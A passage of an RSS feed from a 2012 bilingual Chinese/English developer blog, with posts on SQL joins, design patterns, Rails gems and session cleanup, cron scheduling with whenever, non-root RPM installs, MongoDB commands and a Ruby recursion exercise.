      <link>http://siwei.me/blog/posts/what-if-the-requirements-change-too-frequently</link>
    </item>
    <item>
      <title>SQL 知识复习( SQL tips review) </title>
      <description>&lt;p&gt;SQL 是我最初接触编程时用到的技术。我仅仅在05年的两个项目中使用过。一个是毕业设计，另一个是帮同学写的毕业设计。o(∩∩)o...哈哈。 ( Raw SQL is the technology that I used in my early programming life. I have used them for 2 applications on 2005)&lt;/p&gt;
&lt;p&gt;后来就使用了持久层的技术，( Hibernate, ActiveRecord, Mongoid ) ，所以我的raw SQL底子很差。 (After 2005, I knew the concept "Data Persistent" and used many of the Object-Relational Mapping tools such as: Hibernate(java), ActiveRecord(Ruby on Rails) and Mongoid, even there're some document based database which even directly support model operatons)&lt;/p&gt;
&lt;p&gt;尽管在工作中使用了很多 持久层的技术，以及 文档数据库，但是，了解底层的SQL语句仍然是非常重要的。所以，在这里我把一些边际知识回顾一下(It's very important and very helpful to know the details of the raw SQL although we are working with those data-persistence tool or document based database.&lt;/p&gt;
&lt;h3&gt;1. Join&amp;#160;&lt;/h3&gt;
&lt;p&gt;看到这个图片，我很惊喜，把各种join的用法都说清楚了. ( so , today when I was reviewing the Raw SQL knowledges, I saw this picture. It illustrated all the cases for "Joins" very clearly)&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmIioyMDEyLzA4LzI4LzE1XzEyXzU4XzU0OF9zcWxfam9pbnMuanBnWwg6BnA6CnRodW1iIg00NTB4NDUwPg/sql_joins.jpg" title="Sql Joins" alt="Sql Joins" rel="450x450" width="450" height="354" /&gt;&lt;/p&gt;
&lt;h3&gt;2. group by&lt;/h3&gt;
&lt;p&gt;重点是 ：  对多个列进行group by, (let's focus on the multiple columns' group by)&lt;/p&gt;
&lt;pre&gt;  column1    column2
  1              a
  1              a
  2              a
  2              c
 
  group by column 1 :      
  1          a
  2          a
  group by column 2 : 
  1          a
  2          c
  group by column1, column2   ( or group by column2, column1 )
  1          a
  2          a
  2          c
&lt;/pre&gt;

&lt;h3&gt;3. count() &lt;/h3&gt;
&lt;p&gt;1. 对于普通的count(*) 非常好理解， 返回当前表中的记录行数&lt;/p&gt;
&lt;pre&gt;  column1    column2
  1              a
  1              a
  2              a
  2              c
  select count(*) from ...    
  4
&lt;/pre&gt;
&lt;p&gt;当group by 分句存在时，返回分组的条数。&lt;/p&gt;
&lt;pre&gt;  column1    column2
  1              a
  1              a
  2              a
  2              c
  select count(*) from ... group by column1  
  2
  2
&lt;/pre&gt;

&lt;h3&gt;练习题 (Example)&lt;/h3&gt;
&lt;p&gt; &lt;a href="http://stackoverflow.com/questions/12168751/use-plain-sql-to-match-pairs-of-rows-from-a-table"&gt;见这里(see here)&lt;/a&gt; &lt;/p&gt;</description>
      <pubDate>Tue, 28 Aug 2012 06:52:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/sql-join-review</link>
    </item>
    <item>
      <title>适用设计模式的典型场合（typical use cases for design patterns) </title>
      <description>&lt;p&gt;1. decorator: &amp;#160;向一杯咖啡中，加入 牛奶，糖，巧克力。 或者加入双份巧克力。 ( add sugar, milk and chocolate to a cup of coffee, or add double of sugar to the coffee)&amp;#160;&lt;/p&gt;
&lt;p&gt;2. template: &amp;#160;一份文档，要生成多种格式：HTML, 纯文本，CSV（格式固定由：头，主体，尾部组成） &amp;#160;(Given a source data, &amp;#160;generate multiple formats of documents, e.g. HTML , plain old text and CSV, all of them contains the same structure: HEAD, CONTENT, FOOTER )&amp;#160;&lt;/p&gt;
&lt;p&gt;3. strategy: &amp;#160;一份文档，要生成多种格式： HTML ， 纯文本等等，但是他们的格式不同，例如： HTML 有头，有尾有主干，而纯文本的话只需要主干内容，CSV的话，只有头和主干。 (given a source data, generate, generate multiple formats of documents, e.g. HTML, plain old text and CSV, all of them have the different format. e.g. HTML: head, body, footer. TEXT: content only. CSV: header and content )&amp;#160;&lt;/p&gt;
&lt;p&gt;4. proxy: 需要对某个资源的访问进行权限控制。例如检查用户名密码等。 ( need access control to a resource)&lt;/p&gt;</description>
      <pubDate>Mon, 27 Aug 2012 22:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/typical-uses-cases-for-design-patterns</link>
    </item>
    <item>
      <title>软件开发中的两个东东碰不得（ two traps in software development: history and multiple thread)</title>
      <description>&lt;p&gt;两个东东碰不得： &amp;#160; (There're two kind of nightmares in the software requirement/development)&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 多个模型的历史记录，版本对比 &amp;#160;（多表历史记录） &amp;#160;(multiple model history/revision)&lt;/p&gt;
&lt;p&gt;2. 具有复杂流程的多线程。 ( multiple thread with somehow complicated business logic)&amp;#160;&lt;/p&gt;
&lt;p&gt;其中第一个是最郁闷的。每做必挂。我认为以目前的数据库技术，无法有效解决多个模型的版本对比。（document based DB 的 embed 1 to many 除外，当然了，这个情况也不是最理想的） &amp;#160; ( Case 1. is definitely a very hard problem, I don't think there's a algorithm that could solve this problem -- although there's a case that a document base DB has a document embedding 1 to many relationship )&amp;#160;&lt;/p&gt;
&lt;p&gt;我在2007年自己做过这个，很难测试，难于维护，不稳定。不过幸好没怎么用。 ( I finished a task of case 1, the implementation is hard to test, hard to maintain and not stable at all )&amp;#160;&lt;/p&gt;
&lt;p&gt;我的两个同事也做过这个，其中一个同事因此离职，另一个同事写的代码基本没法看，更没法维护。他做完这个不久也离职了。( 2 of my workmates also have done this kind of job. One was fired by the boss about this issue, another one, who seems better, &amp;#160;has done the task, but the job was done very ugly and impossible to understand. BTW he also was fired after he finished that feature)&amp;#160;&lt;/p&gt;
&lt;p&gt;二，多线程问题。记住：再复杂的问题，在多线程面前也是小巫见大巫。如果在单线程的情况下，这个问题的复杂度是1， 那么在多线程的情况下，它的复杂度就会变成100. 让你各种无语啊。 最恶劣的情况是： &amp;#160;难于测试，难于开发！ &amp;#160;( Case 2. the multiple thread programming. Remember: &amp;#160;Whatever complicated a problem is in a single thread context, it will be even more complicated in the multiple thread environment! &amp;#160; it seems no way to write the unit test (at least for me it is! ) )&lt;/p&gt;
&lt;p&gt;今天先卖个关子，回头我把实际的需求和实现的代码发出来，一对比就知道了。。。 &amp;#160;( I will post the code and the implementation for this 2 issues later. &amp;#160;I promise you will learn a lesson. &amp;#160;)&lt;/p&gt;</description>
      <pubDate>Mon, 27 Aug 2012 22:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/traps-in-software-development</link>
    </item>
    <item>
      <title>为Refinery 使用Blueprint CSS (use Blueprint CSS for your Refinery CMS)</title>
      <description>&lt;p&gt;1. 下载 Blue print, 并压缩。 (Download the Blueprint CSS zipball, from : )  &lt;a href="http://www.blueprintcss.org/" target="_blank"&gt;Blue print website &lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;2. 解压缩，压缩后的文件夹中，有一个叫blueprint的目录，复制到 refinery 项目中。 (Unzip the file and then copy the related files to your refinery folder: )&lt;br /&gt;
  2.1   把对应的CSS 和 image 文件COPY过去  (copy the css file and image file to the asses folder if you are using Rails3) &lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt; cp blueprint/ /apps/personal_site/app/assets/stylesheets/ -r &lt;/pre&gt;
&lt;pre&gt; cp src/grid.png /apps/personal_site/app/assets/images/src/ &lt;/pre&gt;

&lt;p&gt;3. 重点来了： 编译assets &amp;#160;( Now let's work on the assets : )&lt;br /&gt;
  3.1 生成自定制的layout文件。 &amp;#160;( generate customized layout file )&lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt;$ bundle exec rake refinery:override view=layouts/application
&lt;/pre&gt;
&lt;p&gt;
  3.2   编辑 application.html.erb &amp;#160;( edit this file)&amp;#160;&lt;/p&gt;
&lt;pre&gt;  # app/views/layouts/application.html.erb 
  ......
  &amp;lt;%= render '/refinery/head' %&amp;gt; 
  ......
&lt;/pre&gt;
&lt;p&gt;
  3.3   编辑  app/assets/stylesheets/application.css &amp;#160;( edit this file )&amp;#160;&lt;/p&gt;
&lt;pre&gt;  *= require_self
  *= require blueprint/screen.css
  *= require blueprint/print.css
&lt;/pre&gt;
&lt;p&gt;
  3.4 编辑  print.css , 注释掉最后一行： ( comment out the last line of print.css)&lt;/p&gt;
&lt;pre&gt;/* a:link:after, a:visited:after {content:” (” attr(href) “)”;font-size:90%;} 
*/
  &lt;/pre&gt;

&lt;p&gt;4. 编译assets: &amp;#160; (compile the assets)&lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt; RAILS_ENV=production bundle exec  rake assets:precompile &lt;/pre&gt;

&lt;p&gt;5. 重启Rails: &amp;#160;(restart Rails )&amp;#160;&lt;/p&gt;
</description>
      <pubDate>Fri, 24 Aug 2012 09:35:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/add-blueprint-css-to-your-refinerycms</link>
    </item>
    <item>
      <title>一种实现模式：钩子方法  (An implement pattern: hook method)  </title>
      <description>&lt;p&gt;我们经常会用到hook 方法（钩子方法）. 例如： before, after, ... &amp;#160;比如rails，比如delayed_job中。 &amp;#160; ( We have been seen this kind of code everywhere: &amp;#160;before, after... in rails or other libraries such as delayed_job. they are called 'hook method' )&lt;/p&gt;
&lt;p&gt; 最基本的设想是这样的 ( the simplest implementation is as below )&lt;/p&gt;
&lt;pre&gt;def run
  before
  core_method
  after
end
def core_method;  puts 'running the core method' ; end
def before;   puts 'something happens before hand' ; end
def after;  puts 'finally...' ; end

run    # =&amp;gt;   'something happens before hand'
       # =&amp;gt;   'running the core method'
       # =&amp;gt;   'finally...'&lt;/pre&gt;

&lt;p&gt; 尽管上面的代码也工作， 但是还有更好的办法。可读性更强。比如delayed_job 中所使用的： ( Yes, the above code works, however there's a better way to improve the readability. see the implementation from delayed_job as below )&lt;/p&gt;
&lt;pre&gt;class ParanoidNewsletterJob &amp;lt; NewsletterJob
  def perform
    emails.each { |e| NewsletterMailer.deliver_text_to_email(text, e) }
  end
  def before(job)
    record_stat 'newsletter_job/start'
  end
&lt;/pre&gt;

&lt;p&gt;我们可以看到，delayed job 源代码中，中把hook进一步写成了一个macro ( 模拟宏) &amp;#160; ( &amp;#160;We could find that Delayed_job 's source code implements the hooks as a class macro )&amp;#160;&lt;/p&gt;
&lt;pre&gt;      def hook(name, *args)
        if payload_object.respond_to?(name)
          method = payload_object.method(name)
          method.arity == 0 ? method.call : method.call(self, *args)
        end
      rescue DeserializationError
        # do nothing
      end
&lt;/pre&gt;
&lt;p&gt; 然后就可以写成更加自然/理所当然/一目了然的方式： &amp;#160;( Then, the code is more straight forward...)&lt;/p&gt;
&lt;pre&gt;      
     def invoke_job
        hook :before      # instead of:  payload_object.send(:before)
        payload_object.perform
        hook :success
      rescue Exception =&amp;gt; e
        hook :error, e
        raise e
      ensure
        hook :after
      end
&lt;/pre&gt;
&lt;p&gt; 怎么样？  使用了 "hook" 做为macro, 是不是一目了然，核心方法 payload_object.perform 赫然出现。hooks 把它围绕在中心。效果是不是比原来的代码要容易了不少呢？ &amp;#160;( see it? it's more obvious that 'before', 'success' are hooks and the 'payload_object.perform' is the core method. &amp;#160;)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 24 Aug 2012 03:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/implementation-pattern-hook-method</link>
    </item>
    <item>
      <title>使用whenever gem代替 crontab ( use whenever rubygem instead of crontab ) </title>
      <description>&lt;p&gt;&amp;#160;在一个项目中，会有很多情况要用到crontab，最常见的是：&lt;/p&gt;
&lt;p&gt;1. 定时备份数据库&lt;/p&gt;
&lt;p&gt;2. 定时删除无用的日志。&lt;/p&gt;
&lt;p&gt;使用 crontab 的话，需要这样写：

&lt;/p&gt;
&lt;pre&gt;0 * * * * /bin/bash -l -c 'cd /home/sg552/workspace/babble_porta  .....  
&lt;/pre&gt;
可读性很差。 

&lt;p&gt;而如果使用whenever 的话，就可以弄的非常优雅：
Whenever is a Ruby gem that provides a clear syntax for writing and deploying cron jobs. &lt;/p&gt;
1. 安装(Installation ) :   $ gem install whenever   或者：   Or with Bundler in your Gemfile.
&lt;pre&gt;gem 'whenever', :require =&amp;gt; false
&lt;/pre&gt;
2. 建立对应的文件config/schedule.rb     ：  ( create config file) 
&lt;pre&gt;$ cd /apps/my-great-project
$ wheneverize .
&lt;/pre&gt;
This will create an initial config/schedule.rb file for you.
&lt;pre&gt;# config/schedule.rb 
every 5.minutes do
  runner "UserWatchedRepo.update"
end

# in another file, we defined the 'runner'. 
class UserWatchedRepo
  def update
    # do something
  end
end
&lt;/pre&gt;

3. 然后，我们可以查看他生成的crontab:    ( let's check what content it generated )  内容仅供参考 
&lt;pre&gt;sg552@siwei-moto:~/workspace/babble_portal$ whenever
0 0 1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31 * * /bin/bash -l -c 'cd /home/sg552/workspace/babble_portal &amp;amp;&amp;amp; RAILS_ENV=production bundle exec rake 
....................................
## [message] Above is your schedule file converted to cron syntax; your crontab file was not updated.
## [message] Run `whenever --help' for more options.
&lt;/pre&gt;
&lt;p&gt;
4. 最后，让这个crontab 生效： (at last, let's make it to take effect ) &lt;/p&gt;
&lt;pre&gt;sg552@siwei-moto:~/workspace/babble_portal$ whenever --update-crontab
[write] crontab file updated&lt;/pre&gt;
&lt;p&gt;末尾，语法参考，几个区别：&amp;#160;&amp;#160; ( differences between command, runner and rake)&lt;/p&gt;
&lt;p&gt;command : 用的是最纯粹的shell command. 例如 :&amp;#160;&amp;#160; 'touch /tmp/some_file"&amp;#160;&amp;#160;&amp;#160; ( a shell command) &lt;/p&gt;
&lt;p&gt;runner :&amp;#160; 用的是Ruby的类，例如：&amp;#160;&amp;#160;&amp;#160;&amp;#160; SomeClass.some_method&amp;#160;&amp;#160; ( a ruby's method call)&lt;/p&gt;
&lt;p&gt;rake :&amp;#160; 用的是rake 命令。&amp;#160;&amp;#160; ( a rake task ) &lt;/p&gt;
</description>
      <pubDate>Thu, 23 Aug 2012 06:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/use-whenever-instead-of-crontab</link>
    </item>
    <item>
      <title>问题与解决方案：rails中的gem也会影响到内存占用(more gems consume more memories in rails app)</title>
      <description>&lt;p&gt;在一个rails 应用中，都会遇到优化的问题。 （ 跟java不太一样。呵呵） &amp;#160; ( every Rails app will meet the performance optimization problems when or before it is being delivered. &amp;#160;-- which is not the same with JAVA, as far as I know, &amp;#160;it is much less things to do for java app. )&amp;#160;&lt;/p&gt;
&lt;p&gt;而我最近遇到了一个问题，就是发现，不同的rails app占用的内存不一样。似乎这个问题主要由rubygems引起的。(recently I met a problem that different rails applications consume different memories, and it seems that the root cause of this problem is the rubygems )&lt;/p&gt;
&lt;p&gt;项目A：引用了 38个gem, 运行起来占用 100MB 内存。 (app A: required 38 gems, and cost me 100 MB memories)&amp;#160;&lt;/p&gt;
&lt;p&gt;项目B： 引用了 10个 gem, 运行起来占用 30 MB 内存。（app B: required 10 gems and cost me 30 MB memories when running)&lt;/p&gt;
&lt;p&gt;所以，优化gems的几个方法： ( so this is the solutions: )&lt;/p&gt;
&lt;p&gt;1. 使用 groups. 这样在发布的时候，就可以忽略devlopment, test 这些group中定义的gem . &amp;#160;例如： &amp;#160;( define groups for different gems by purpose. e.g. &amp;#160;'production' environment will ignore those gems in 'development' groups)&lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt;# gems used only for test/dev purpose
group :test, :development do
  gem "rspec-rails", "&amp;gt;= 2.5.0"
  gem 'factory_girl', '2.6.4'
  gem 'factory_girl_rails'
end

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails',   '~&amp;gt; 3.2.3'
  gem 'coffee-rails', '~&amp;gt; 3.2.1'
end
&lt;/pre&gt;

&lt;p&gt;2. 使用 require =&amp;gt; false 来声明gem, 但是等到需要的时候才require . 例如： &amp;#160;( use :require =&amp;gt; false to install the gems but not 'require' them automatically )&lt;/p&gt;
&lt;pre&gt;gem 'whenever', :require =&amp;gt; false
&lt;/pre&gt;
&lt;p&gt;参考资料：&lt;a href="http://stackoverflow.com/questions/4800721/bundler-what-is-the-require-false-on-the-gemfile-means" title="http://stackoverflow.com/questions/4800721/bundler-what-is-the-require-false-on-the-gemfile-means" target="_blank"&gt;http://stackoverflow.com/questions/4800721/bundler-what-is-the-require-false-on-the-gemfile-means&lt;/a&gt;
&lt;/p&gt;

</description>
      <pubDate>Wed, 22 Aug 2012 01:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/more-rubygems-consume-more-memories-in-rails</link>
    </item>
    <item>
      <title>centos非root用户安装软件(install package with non-root user)</title>
      <description>&lt;p&gt;虽然我喜欢ubuntu, 虽然我做惯了root, 但是还是会遇到自己是non root用户的时候。要安装一个mysql client.&amp;#160; ( Though I love using ubuntu, and I have been used to be root, however in real world I have to be non-root for some times, so , today, I have to install mysql client for myself. ) &lt;/p&gt;
&lt;p&gt; 假设你的HOME 目录是 /home/user, 假设要安装的rpm是: package.rpm: ( assuming your HOME folder is: /home/user, and the target package you want to install is: package.rm) &lt;/p&gt;
&lt;pre&gt;1.rpm –initdb –root /home/user/local –dbpath lib/rpm&lt;/pre&gt;
&lt;pre&gt;2.rpm -qlp package.rpm&lt;/pre&gt;
&lt;pre&gt;3.rpm -ivh package.rpm&lt;/pre&gt;
&lt;pre&gt;4.rpm –root /home/user/local –dbpath lib/rpm --relocate /usr=/home/username/local --nodeps -ivh package.rpm&lt;/pre&gt;
&lt;p&gt;参考： &lt;a href="http://ajaya.name/?p=6353" target="_blank"&gt;Install a rpm in home directory as non-root &lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Tue, 21 Aug 2012 07:33:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-rpm-as-non-root</link>
    </item>
    <item>
      <title>Rails: 记得要定时清理session 表 ( Rails: Do remember to clear your session table! )</title>
      <description>&lt;p&gt;明天要给国外同事做一个演示，关于我过去一年多参与的项目。于是我打算在生产服务器上做，环境很干净，而且速度快（8G内存）。于是乎，我就做了个数据库备份。( Due to a demonstration for a project that I have been working on since last year on tomorrow, to some US workmates, I did a database backup operation on the production server which is more faster than another server, and hope to restore the data once the demo is done. )   &lt;/p&gt;
&lt;pre&gt;[babble@bportal02 ~]$ /home/kcv478/local/bin/mysqldump -u babble -p -h dbbabble-vip01.mcloud201.blur.svcmot.com babble_portal &amp;gt; babble_portal.sql
&lt;/pre&gt;
&lt;p&gt;可是，当我仔细查看文件的时候，我愣了。。。( However I was shocked when the dump is done ) &lt;/p&gt;
&lt;pre&gt;-rw-rw-r--   1 babble babble 223512238 Aug 21 06:26 babble_portal.sql
&lt;/pre&gt;
&lt;p&gt;这么多位数字。。。我数数。。。 223 MB。 奇了怪了，这个APP现在应该啥数据都没有，只有些初始化的数据啊。( 223MB.... so strange, it should don't contain any data except some initial data that used by the system, less than 1k. ) &lt;/p&gt;
&lt;p&gt;找了一下原因，发现是这样的：&amp;#160;&amp;#160;&amp;#160;&amp;#160; ( after digging into the problem, I found that: )&lt;br /&gt;1. 我们使用了session store.&amp;#160;&amp;#160; ( 1. we used session store instead of cookie store) &lt;br /&gt;2. 有个监控程序，每秒ping 一下系统。 ( 2. there's a monitor system which has been pinging our app every 1 second)&lt;br /&gt;于是，从 8月7号到现在（8月21号），session表中产生了 120万条记录。&amp;#160; ( so, from Aug 7th til now, 1.2 million records were created in the sessions table by Rails) &lt;/p&gt;
&lt;p style="color: darkred; font-weight:bold"&gt;问题的根源是：&amp;#160; Rails 不会主动删除这些session 数据！ ( and the interesting thing is: Rails will never delete these data automatically ) &lt;/p&gt;
&lt;p&gt;解决办法简单了：&lt;br /&gt;1. 你可以使用crontab + mysql client.&amp;#160; &lt;br /&gt;2. 你可以使用 rake task + crontab&lt;br /&gt;3. 你也可以使用 &lt;a target="_blank" title="https://github.com/javan/whenever" href="https://github.com/javan/whenever"&gt;whenever&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;我打算使用 &lt;a target="_blank" title="https://github.com/javan/whenever" href="https://github.com/javan/whenever"&gt;whenever&lt;/a&gt; 来做。改天记录下来吧～～～&amp;#160; &lt;/p&gt;
&lt;p&gt;参考：&amp;#160;&lt;a href="http://realityforge.org/code/rails/2006/03/01/removing-stale-rails-sessions.html" title="http://realityforge.org/code/rails/2006/03/01/removing-stale-rails-sessions.html" target="_blank"&gt;http://realityforge.org/code/rails/2006/03/01/removing-stale-rails-sessions.html&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Tue, 21 Aug 2012 07:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/remember-to-clear-the-session-table-for-rails</link>
    </item>
    <item>
      <title>使用mongodb 的基本命令 ( basic commands for mongodb)</title>
      <description>&lt;p&gt;说实话，我觉得挺奇怪的，不能自动的 repair, 然后启动吗？&amp;#160; 名字还叫做 fork... 叫daemon 多好理解啊哥哥。。。&lt;/p&gt;
&lt;p&gt;启动(start)：&amp;#160; sudo mongod -f /etc/mongodb.conf --fork&lt;/p&gt;
&lt;p&gt;系统不正常关机之后，需要修复(repair)：&amp;#160; sudo mongod -f /etc/mongodb.conf --repair&lt;/p&gt;
&lt;p&gt;加入embed记录：(insert embedded record)&lt;/p&gt;
&lt;pre&gt;&amp;gt; show collections;
destricts
districts
system.indexes
&amp;gt; db.destricts.remove()
&amp;gt; db.districts.find()
{ "_id" : ObjectId("503312e519cdff8116fbe353"), "name" : "haizhouqu" }
{ "_id" : ObjectId("5033131119cdff8116fbe354"), "name" : "taipingqu", "child_locations" : { "name" : "zhonghualu" } }
&amp;gt; street1 = { "name": "jiefangdajie"}
{ "name" : "jiefangdajie" }
&amp;gt; street2 = {"name" : 'zhonghualu'}
{ "name" : "zhonghualu" }
&amp;gt; db.districts.insert({'name': 'xihequ', child_locations: [street1, street2]})
&amp;gt; db.districts.find()
{ "_id" : ObjectId("503312e519cdff8116fbe353"), "name" : "haizhouqu" }
{ "_id" : ObjectId("5033131119cdff8116fbe354"), "name" : "taipingqu", "child_locations" : { "name" : "zhonghualu" } }
{ "_id" : ObjectId("50331415bb69e1c371096a6b"), "name" : "xihequ", "child_locations" : [ { "name" : "jiefangdajie" }, { "name" : "zhonghualu" } ] }
&amp;gt; 

&lt;/pre&gt;</description>
      <pubDate>Tue, 21 Aug 2012 03:03:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/basic-usage-for-mongodb</link>
    </item>
    <item>
      <title>不要多表版本控制 ( Never try to use multiple table version control )</title>
      <description>&lt;p&gt;TODO: more content here&lt;/p&gt;</description>
      <pubDate>Mon, 20 Aug 2012 21:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/no-multiple-table-version-control</link>
    </item>
    <item>
      <title>前几天被一个动态规划的题目难倒了。。。( a dynamic program question:triangle. ) </title>
      <description>
&lt;p&gt;&lt;a target="_blank" title="http://poj.org/problem?id=1163" href="http://poj.org/problem?id=1163"&gt;参考：http://poj.org/problem?id=1163&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;做为一个WEB开发的人，我表示对数据结构一无所知，一塌糊涂，忘的一光二净，看题时一头雾水，解题时异想天开。所以。。。同学们不必看了。。。写在这里，就不往github上放了。。。 &lt;/p&gt;
&lt;p&gt;有个题目：给出一个树状结构：&lt;br /&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; A&lt;br /&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; B&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; C &lt;br /&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160; D&amp;#160;&amp;#160;&amp;#160;&amp;#160; E&amp;#160;&amp;#160;&amp;#160;&amp;#160; F&lt;br /&gt;&amp;#160; G&amp;#160;&amp;#160;&amp;#160; H&amp;#160;&amp;#160;&amp;#160;&amp;#160; I&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; J&lt;br /&gt;列出所有可能的路径， 例如：&amp;#160;&amp;#160; &lt;br /&gt;1.&amp;#160; ABDG&lt;br /&gt;2.&amp;#160; ABDH&lt;br /&gt;3.&amp;#160; ABEH&lt;br /&gt;4.&amp;#160; ABEI 。。。&lt;/p&gt;
&lt;p&gt;一想就是个递归函数。。。头大啊。所以，我的思维不够灵光，只好用最笨的方法来遍历它。RUBY代码放在这里，有机缘的时候再试试其他的ACM题目吧。。。&lt;/p&gt;
&lt;pre&gt;class Tree
  def initialize(nodes)
    @nodes = nodes

    # init the matrix
    @matrix = []
    @nodes.each_with_index { |row, i | 
        @matrix[i] = []
        row.each_with_index { |cell, j|
            @matrix[i][j] = cell
        }   
    }   
  end 
  def print
    @matrix.each { |row| puts row.inspect; }
  end 
  def routes
    @result = []
    set_route_by_node(0, 0, "") 
    puts '==='
    puts @result
  end 
  def set_route_by_node(column_index, row_index, route_from_parent)
    route = route_from_parent + @matrix[row_index][column_index]
    puts "== considering: row:#{row_index}, column:#{column_index}, route: #{route}"
    # should return for the leaves.
    if row_index + 1 == @matrix.size
      puts '++++++++++++++++++++++++++++++++== a branch is done'
      @result &amp;lt;&amp;lt; route
    else
      # left child
      puts '-- setting left child'
      set_route_by_node(column_index, row_index + 1, route)
      # right child
      puts '-- setting right child'
      set_route_by_node(column_index + 1, row_index + 1, route)
    end
  end
end

tree = Tree.new([['a'], ['b','c'], ['d','e','f'], ['g','h','i','j']])

# a
# b  c
# d  e  f
# g  h  i  j
tree.print

# "a,b,d,g"
# "a,b,d,h"
# "a,b,e,g"
# "a,b,e,h" ...
tree.routes
&lt;/pre&gt;
&lt;p&gt;输出是：&lt;/p&gt;
&lt;pre&gt;sg552@siwei-moto:~/workspace/recursive_function_exams$ ruby print_tree.rb
["a"]
["b", "c"]
["d", "e", "f"]
["g", "h", "i", "j"]
== considering: row:0, column:0, route: a
-- setting left child
== considering: row:1, column:0, route: ab
-- setting left child
== considering: row:2, column:0, route: abd
-- setting left child
== considering: row:3, column:0, route: abdg
++++++++++++++++++++++++++++++++== a branch is done
-- setting right child
== considering: row:3, column:1, route: abdh
++++++++++++++++++++++++++++++++== a branch is done
-- setting right child
== considering: row:2, column:1, route: abe
-- setting left child
== considering: row:3, column:1, route: abeh
++++++++++++++++++++++++++++++++== a branch is done
-- setting right child
== considering: row:3, column:2, route: abei
++++++++++++++++++++++++++++++++== a branch is done
-- setting right child
== considering: row:1, column:1, route: ac
-- setting left child
== considering: row:2, column:1, route: ace
-- setting left child
== considering: row:3, column:1, route: aceh
++++++++++++++++++++++++++++++++== a branch is done
-- setting right child
== considering: row:3, column:2, route: acei
++++++++++++++++++++++++++++++++== a branch is done
-- setting right child
== considering: row:2, column:2, route: acf
-- setting left child
== considering: row:3, column:2, route: acfi
++++++++++++++++++++++++++++++++== a branch is done
-- setting right child
== considering: row:3, column:3, route: acfj
++++++++++++++++++++++++++++++++== a branch is done
===
abdg
abdh
abeh
abei
aceh
acei
acfi
acfj&lt;/pre&gt;
</description>
      <pubDate>Mon, 20 Aug 2012 04:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/the-simplest-acm-question-the-triangle</link>
    </item>
    <item>
      <title>如何入门 nodejs? (what's the tutorial for nodejs?)</title>
      <description>&lt;p&gt;&lt;a href="http://nodejs.org" title="http://nodejs.org" target="_blank"&gt;Node.js&lt;/a&gt; 是非常著名的服务器技术，但是入门的文章很少。官方站点的文档也无法让人看懂。更是一个API。看着满目的API，心想要是有个 &lt;a href="http://guide.rubyonrails.org/" title="http://guide.rubyonrails.org/" target="_blank"&gt;rails guide&lt;/a&gt; 类似的文档多好。 所以，我找到了这个答案: &lt;a href="http://stackoverflow.com/questions/2353818/how-do-i-get-started-with-node-js" title="http://stackoverflow.com/questions/2353818/how-do-i-get-started-with-node-js" target="_blank"&gt;如何入门nodejs&lt;/a&gt;.&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://nodejs.org" title="http://nodejs.org" target="_blank"&gt;Node.js&lt;/a&gt; is one of the most popular framework nowadays, however there's no guide (like &lt;a href="http://guide.rubyonrails.org/" title="http://guide.rubyonrails.org/" target="_blank"&gt;guide.rubyonrails.com&lt;/a&gt;) on its official website, instead, the documents there are more like APIs. so I hope the resources below will be helpful. (see :&amp;#160;&lt;a href="http://stackoverflow.com/questions/2353818/how-do-i-get-started-with-node-js" title="http://stackoverflow.com/questions/2353818/how-do-i-get-started-with-node-js" target="_blank"&gt;http://stackoverflow.com/questions/2353818/how-do-i-get-started-with-node-js&lt;/a&gt; )&lt;/p&gt;

&lt;div&gt;&lt;p&gt;&lt;strong&gt;Tutorials&amp;#160;&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nodeguide.com/" rel="nofollow"&gt;Node.js guide&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nodetuts.com/" rel="nofollow"&gt;Node tuts&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Videos&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.youtube.com/watch?v=jo_B4LTHi3I" rel="nofollow"&gt;Introduction to Node.js with Ryan Dahl&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.infoq.com/presentations/nodejs" rel="nofollow"&gt;Node.js: Asynchronous Purity Leads to Faster Development&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.infoq.com/presentations/Parallel-Programming-with-Nodejs" rel="nofollow"&gt;Parallel Programming with Node.js&lt;/a&gt;
&lt;/li&gt;
